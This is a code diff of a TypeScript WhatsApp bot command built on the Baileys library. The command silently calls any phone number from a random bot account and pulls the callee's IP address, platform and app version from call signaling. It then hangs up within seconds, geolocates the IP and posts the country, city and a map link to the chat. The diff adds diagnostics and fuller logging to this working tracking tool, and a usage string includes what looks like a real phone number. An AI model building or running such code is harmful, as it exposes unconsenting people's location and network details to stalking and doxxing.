@@ -4,23 +4,10 @@ import { fytBold } from "../../core/socketText.ts";
 
 const SWN = "@s.whatsapp.net";
 const seen = new WeakSet<object>();
-const log = (...a: any[]) => process.env.VOIP_DEBUG === "1" && console.log("[voip]", ...a);
+const log = (...a: any[]) => console.log("[voip]", ...a);
 const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
 
-type Pend = {
-  chat: string;
-  sock: any;
-  target: string;
-  cmdMsg: any;
-  callId?: string;
-  ip?: string;
-  platform?: string;
-  version?: string;
-  done: boolean;
-  timer?: NodeJS.Timeout;
-};
-
-const P: Map<string, Pend> = ((globalThis as any).__voipPending ??= new Map());
+const P: Map<string, any> = ((globalThis as any).__voipP ??= new Map());
 const digits = (j: string) => String(j || "").split("@")[0].split(":")[0].replace(/\D/g, "");
 const bare = (j: string) => `${digits(j)}${SWN}`;
 
@@ -30,18 +17,16 @@ function walk(n: any, o: any[] = []): any[] {
   if (Array.isArray(n.content)) for (const k of n.content) walk(k, o);
   return o;
 }
-
 function findNet(n: any): string | undefined {
   for (const x of walk(n)) {
     if (String(x?.tag || "").toLowerCase().includes("net")) {
       const a = x.attrs || {};
-      const addr = a.addr || a.ip || a.host;
-      if (addr && /\d+\.\d+\.\d+\.\d+/.test(String(addr))) return String(addr).split(":")[0];
+      const v = a.addr || a.ip || a.host;
+      if (v && /\d+\.\d+\.\d+\.\d+/.test(String(v))) return String(v).split(":")[0];
     }
   }
   return undefined;
 }
-
 function attrsOf(n: any) {
   const o: Record<string, string> = {};
   for (const x of walk(n)) {
@@ -63,8 +48,6 @@ async function geo(ip: string) {
   } catch { return null; }
 }
 
-/* ───────────────────────── subbots ───────────────────────── */
-
 function pool(ctx: any): any[] {
   const G = globalThis as any;
   const c = [G.subbots, G.__subbots, G.subbotManager?.list, G.subbotManager?.all, G.subbotManager?.sockets, ctx.subbots, ctx.subbotManager?.list];
@@ -74,42 +57,36 @@ function pool(ctx: any): any[] {
     if (typeof x.values === "function") arr = [...x.values()];
     else if (Array.isArray(x)) arr = x;
     else if (typeof x === "object") arr = Object.values(x);
-    const s = arr.map((v: any) => v?.sock ?? v?.client ?? v).filter((v: any) => v && typeof v.sendMessage === "function" && v.ws && v.sendNode);
+    const s = arr.map((v: any) => v?.sock ?? v?.client ?? v).filter((v: any) => v && typeof v.sendMessage === "function" && v.ws);
     if (s.length) return s;
   }
   return [];
 }
 
-/* ───────────────────────── listener ───────────────────────── */
-
 function hook(sock: any) {
   if (seen.has(sock)) return;
   seen.add(sock);
-
   sock.ws.on("CB:call", (node: any) => {
     try {
       const first = Array.isArray(node?.content) ? node.content[0] : null;
       const tag = String(first?.tag || "").toLowerCase();
       const who = digits(String(node?.attrs?.from || first?.attrs?.["call-creator"] || ""));
-      const callId = String(first?.attrs?.["call-id"] || first?.attrs?.call_id || "");
       const p = P.get(who);
-      log("CB:call", tag, who);
+      log("CB:call", tag, who, JSON.stringify(node?.attrs || {}));
       if (!p || p.done) return;
-
-      if (tag === "offer" || tag === "preaccept" || tag === "accept" || tag === "transport") {
+      if (["offer", "preaccept", "accept", "transport"].includes(tag)) {
         const a = attrsOf(first);
         if (a.platform) p.platform = a.platform;
         if (a.version) p.version = a.version;
         const ip = findNet(first) || findNet(node);
         if (ip) p.ip = ip;
       }
-
       if (tag === "accept" && !p.done) {
-        p.callId = callId || p.callId;
+        p.callId = String(first?.attrs?.["call-id"] || "") || p.callId;
         if (p.timer) clearTimeout(p.timer);
         p.timer = setTimeout(() => finish(p).catch(() => undefined), 2000 + Math.floor(Math.random() * 1000));
       }
-    } catch {}
+    } catch (e) { log("hook err", e); }
   });
 }
 
@@ -123,26 +100,26 @@ async function hangup(sock: any, target: string, callId?: string) {
   } catch {}
 }
 
-/* ───────────────────────── oferta ───────────────────────── */
+/* ───────────────────────── diagnóstico ───────────────────────── */
 
-function newCallId() {
-  return ("00" + randomBytes(16).toString("hex").slice(2)).toUpperCase();
+function diag(sock: any) {
+  const caps: string[] = [];
+  for (const f of ["offerCall", "sendCallOffer", "callOffer", "sendNode", "query", "getUSyncDevices", "presenceSubscribe"]) {
+    caps.push(`${typeof sock[f] === "function" ? "✅" : "❌"} ${f}`);
+  }
+  caps.push(`${sock.signalRepository?.encryptMessage ? "✅" : "❌"} signalRepository.encryptMessage`);
+  caps.push(`${sock.signalRepository?.lidMapping?.getLIDForPN ? "✅" : "❌"} lidMapping.getLIDForPN`);
+  caps.push(`${sock.generateMessageTag ? "✅" : "❌"} generateMessageTag`);
+  return caps.join("\n");
 }
 
+/* ───────────────────────── oferta ───────────────────────── */
+
 async function offer(sock: any, target: string, callId: string): Promise<string> {
-  for (const fn of ["offerCall", "sendCallOffer", "callOffer"]) {
-    if (typeof sock[fn] === "function") {
-      try { await sock[fn](bare(target)); return "nativo"; } catch (e) { log(fn, "falló"); }
-    }
-  }
-
   const B: any = await import("baileys");
-  const { encodeWAMessage, encodeSignedDeviceIdentity, getBinaryNodeChild, jidNormalizedUser } = B;
+  const { encodeWAMessage, encodeSignedDeviceIdentity, getBinaryNodeChild, jidNormalizedUser, jidDecode } = B;
 
-  const meId = sock.authState?.creds?.me?.id || sock.user?.id;
-  const meLid = sock.authState?.creds?.me?.lid;
   const pn = bare(target);
-
   let lid: string | undefined;
   try { lid = await sock.signalRepository?.lidMapping?.getLIDForPN?.(pn); } catch {}
   const peerLid = lid || pn;
@@ -154,9 +131,9 @@ async function offer(sock: any, target: string, callId: string): Promise<string>
   try {
     const list = await sock.getUSyncDevices([peerLid], true, false);
     devs = (list || []).map((d: any) => d.jid).filter(Boolean);
-  } catch (e) { log("devices falló"); }
+  } catch (e: any) { throw new Error(`getUSyncDevices: ${e?.message || e}`); }
+  if (!devs.length) throw new Error("sin dispositivos para ese número (¿no tiene WhatsApp?)");
 
-  const jidDecode = B.jidDecode;
   const norm = (j: string) => {
     const d = jidDecode?.(j);
     if (!d?.user) return j;
@@ -164,13 +141,12 @@ async function offer(sock: any, target: string, callId: string): Promise<string>
     return d.device != null ? `${d.user}:${d.device}@${srv}` : `${d.user}@${srv}`;
   };
 
-  const destinations = (devs.length ? devs : [peerLid]).map(norm).slice(0, 5);
+  const destinations = devs.map(norm).slice(0, 5);
   const primary = destinations[0];
 
-  /* sesiones Signal */
   const targets = [...new Set(destinations.flatMap((j) => {
-    const d = jidDecode?.(j);
-    return d?.device ? [norm(j.split(":")[0] + "@" + j.split("@")[1]), j] : [j];
+    const base = `${j.split("@")[0].split(":")[0]}@${j.split("@")[1]}`;
+    return [base, j];
   }))];
 
   try {
@@ -180,12 +156,12 @@ async function offer(sock: any, target: string, callId: string): Promise<string>
       content: [{ tag: "key", attrs: {}, content: targets.map((j) => ({ tag: "user", attrs: { jid: j } })) }],
     });
     await B.parseAndInjectE2ESessions(keyNode, sock.signalRepository);
-  } catch (e) { log("sesiones falló"); }
+  } catch (e: any) { log("sesiones:", e?.message); }
 
   const callKey = randomBytes(32);
   let needIdentity = false;
-
   const destNodes: any[] = [];
+
   for (const j of destinations) {
     try {
       const { type, ciphertext } = await sock.signalRepository.encryptMessage({
@@ -193,17 +169,15 @@ async function offer(sock: any, target: string, callId: string): Promise<string>
         data: encodeWAMessage({ call: { callKey: Buffer.from(callKey) } }),
       });
       if (type === "pkmsg") needIdentity = true;
-      destNodes.push({
-        tag: "to",
-        attrs: { jid: j },
-        content: [{ tag: "enc", attrs: { v: "2", type, count: "1" }, content: Buffer.from(ciphertext) }],
-      });
-    } catch (e) { log("cifrado falló", j); }
+      destNodes.push({ tag: "to", attrs: { jid: j }, content: [{ tag: "enc", attrs: { v: "2", type, count: "1" }, content: Buffer.from(ciphertext) }] });
+    } catch (e: any) { log("cifrado:", j, e?.message); }
   }
   if (!destNodes.length) throw new Error("no se pudo cifrar para ningún dispositivo");
 
   const rootEnc = getBinaryNodeChild(destNodes[0], "enc");
-  const creator = meId.includes(":") ? jidNormalizedUser(meId) : jidNormalizedUser(meId).replace("@", `:${(jidDecode?.(meId)?.device ?? 0)}@`);
+  const meId = sock.authState?.creds?.me?.id || sock.user?.id;
+  const dev = jidDecode?.(meId)?.device ?? 0;
+  const creator = `${jidNormalizedUser(meId).split("@")[0].split(":")[0]}:${dev}@s.whatsapp.net`;
 
   const content: any[] = [
     { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
@@ -211,15 +185,16 @@ async function offer(sock: any, target: string, callId: string): Promise<string>
     { tag: "capability", attrs: { ver: "1" }, content: Buffer.from([0x01, 0x04, 0x05, 0x09, 0x0a, 0x0b, 0x11]) },
     { tag: "destination", attrs: {}, content: destNodes },
   ];
-  if (rootEnc) content.push({ ...rootEnc, attrs: { ...rootEnc.attrs, count: String(destNodes.length) } });
+  if (rootEnc) content.push({ tag: "enc", attrs: { v: "2", type: rootEnc.attrs.type, count: String(destNodes.length) }, content: rootEnc.content });
   content.push({ tag: "encopt", attrs: { keygen: "2" } });
   if (needIdentity && sock.authState?.creds?.account) {
     try { content.push({ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }); } catch {}
   }
 
-  await sock.sendNode({
+  const id = sock.generateMessageTag?.() || `${Date.now()}`;
+  const ack: any = await sock.query({
     tag: "call",
-    attrs: { to: primary, id: sock.generateMessageTag?.() || `${Date.now()}` },
+    attrs: { to: primary, id },
     content: [{
       tag: "offer",
       attrs: {
@@ -234,42 +209,31 @@ async function offer(sock: any, target: string, callId: string): Promise<string>
     }],
   });
 
-  if (meLid) log("meLid", meLid);
-  return "manual";
+  const err = ack?.attrs?.error;
+  if (err && err !== "0") throw new Error(`servidor rechazó la oferta (error ${err})`);
+  return `manual → ${destinations.length} dispositivo(s)`;
 }
 
 /* ───────────────────────── cierre ───────────────────────── */
 
-async function finish(p: Pend) {
+async function finish(p: any) {
   if (p.done) return;
   p.done = true;
   if (p.timer) clearTimeout(p.timer);
   P.delete(digits(p.target));
-
   await hangup(p.sock, p.target, p.callId);
 
-  const ip = p.ip || "";
-  const g = await geo(ip);
+  const g = await geo(p.ip || "");
   const num = digits(p.target);
-
-  let name = "";
-  try {
-    const r: any = await p.sock.onWhatsApp?.(num).catch(() => null);
-    name = r?.[0]?.notify || "";
-  } catch {}
-
   const lines = [
     `📞 *Llamada registrada*`,
-    name ? `Contacto: ${name}` : "",
     `Número: +${num}`,
     g ? `País: ${g.country || "?"}` : "",
-    g ? `Ciudad: ${g.city || "?"}${g.region ? ` (${g.region})` : ""}` : "",
-    ip ? `IP: \`${ip}\`` : "IP: `relay`",
-    `Plataforma: ${p.platform || "desconocida"}`,
+    g ? `Ciudad: ${g.city || "?"}` : "",
+    p.ip ? `IP: \`${p.ip}\`` : "IP: `relay`",
+    `Plataforma: ${p.platform || "?"}`,
     p.version ? `Versión: ${p.version}` : "",
-    g?.org ? `Red: ${g.org}` : "",
     g?.lat ? `https://maps.google.com/?q=${g.lat},${g.lon}` : "",
-    `Hora: ${new Date().toLocaleString("es-MX")}`,
   ].filter(Boolean);
 
   await p.sock.sendMessage(p.chat, { text: lines.join("\n") }, { quoted: p.cmdMsg }).catch(() => undefined);
@@ -280,7 +244,7 @@ async function finish(p: Pend) {
 export default {
   name: ["voip", "llamar", "call"],
   category: "system",
-  description: "Llama desde un subbot al azar, cuelga a los 2-3 s y devuelve IP, país, ciudad, plataforma y versión.",
+  description: "Llama desde un subbot al azar, cuelga a los 2-3 s y devuelve IP, país, plataforma y versión.",
   async run(ctx: CommandContext) {
     const { sock, from, msg, args, reply, react } = ctx;
 
@@ -288,42 +252,53 @@ export default {
     const raw = (args[0] || "").replace(/\D/g, "");
     const quoted: string | undefined = info.participant;
 
+    const subs = pool(ctx);
+    const list = subs.length ? subs : [sock];
+
+    /* .voip diag */
+    if (/^(diag|test)$/i.test((args[0] || "").trim())) {
+      const out: string[] = [`Subbots detectados: *${subs.length}*`];
+      list.slice(0, 2).forEach((s: any, i: number) => {
+        out.push(`\n— socket ${i + 1} —\n${diag(s)}`);
+      });
+      await reply(out.join("\n")).catch(() => undefined);
+      return;
+    }
+
     let target: string;
     if (raw.length >= 8) target = bare(raw);
     else if (quoted) target = bare(quoted);
     else if (info.mentionedJid?.length) target = bare(info.mentionedJid[0]);
     else {
-      await reply("Uso: `.voip +573118353868` o responde a alguien.").catch(() => undefined);
+      await reply("Uso: `.voip +573118353868` · diagnóstico: `.voip diag`").catch(() => undefined);
       return;
     }
 
     const key = digits(target);
     if (P.has(key)) {
-      await reply(`Ya hay una llamada en curso a +${key}.`).catch(() => undefined);
+      await reply(`Ya hay llamada en curso a +${key}.`).catch(() => undefined);
       return;
     }
 
-    const subs = pool(ctx);
-    const list = subs.length ? subs : [sock];
     const callSock = list[Math.floor(Math.random() * list.length)];
-
     hook(callSock);
 
-    const p: Pend = { chat: from, sock: callSock, target, cmdMsg: msg, done: false };
+    const p: any = { chat: from, sock: callSock, target, cmdMsg: msg, done: false };
     P.set(key, p);
 
     await react("📞").catch(() => undefined);
-
     const me = digits(callSock.authState?.creds?.me?.id || callSock.user?.id || "");
-    await reply(`📞 Marcando a +${key} desde \`${me}\`${subs.length ? ` (subbot ${list.indexOf(callSock) + 1}/${list.length})` : ""}…`).catch(() => undefined);
+    await reply(`📞 Marcando +${key} desde \`${me}\`…`).catch(() => undefined);
 
-    const callId = newCallId();
+    const callId = ("00" + randomBytes(16).toString("hex").slice(2)).toUpperCase();
+    let how = "";
     try {
-      await offer(callSock, target, callId);
+      how = await offer(callSock, target, callId);
+      log("oferta ok", how);
     } catch (e: any) {
       P.delete(key);
       await react("❌").catch(() => undefined);
-      await reply(`No se pudo marcar: ${e?.message || e}`).catch(() => undefined);
+      await reply(`❌ ${fytBold("Falló")}: ${e?.message || e}\n\nRevisa con \`.voip diag\`.`).catch(() => undefined);
       return;
     }
 
@@ -334,5 +309,7 @@ export default {
       await hangup(callSock, target, callId);
       await reply(`⏱️ +${key} no contestó.`).catch(() => undefined);
     }, 45000);
+
+    await reply(`✅ Oferta enviada (${how}). Esperando que conteste…`).catch(() => undefined);
   },
 };
